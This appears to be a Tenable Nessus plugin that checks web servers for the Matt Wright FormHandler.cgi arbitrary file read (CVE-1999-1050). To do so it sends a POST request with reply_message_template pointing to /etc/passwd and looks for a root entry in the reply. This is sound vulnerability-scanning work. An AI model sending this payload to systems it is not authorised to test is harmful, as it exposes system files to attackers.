#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10075);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-1999-1050");
 script_bugtraq_id(799);
 script_xref(name:"OSVDB", value:"7012");
 script_xref(name:"OSVDB", value:"7013");

 script_name(english:"Matt Wright FormHandler.cgi Arbitrary File Access");
 script_summary(english:"Attempts to read /etc/passwd");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has an information disclosure\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The 'FormHandler.cgi' CGI is installed. This CGI has an information\n",
     "disclosure vulnerability that lets anyone read arbitrary files with\n",
     "the privileges of the web server.  A remote attacker could use this\n",
     "to read sensitive information, which could be used to mount further\n",
     "attacks."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/1602.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this script from the server."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "smtp_settings.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

domain = get_kb_item("Settings/third_party_domain");
url = '/FormHandler.cgi';
header = make_array("Content-type", "application/x-www-form-urlencoded");
postdata = string(
  "realname=", SCRIPT_NAME, "&",
  "email=aaa&",
  "reply_message_template=%2Fetc%2Fpasswd&",
  "reply_message_from=nessus%40", domain, "&",
  "redirect=http%3A%2F%2Fwww.", domain, "&",
  "recipient=nessus%40", domain
);
res = http_send_recv3(
  method:"POST",
  item:url,
  port:port,
  add_headers:header,
  data:postdata
);
if (isnull(res)) exit(1, "The server didn't respond");

if(egrep(pattern:"root:.*:0:[01]:.*", string:res[2])) security_warning(port);

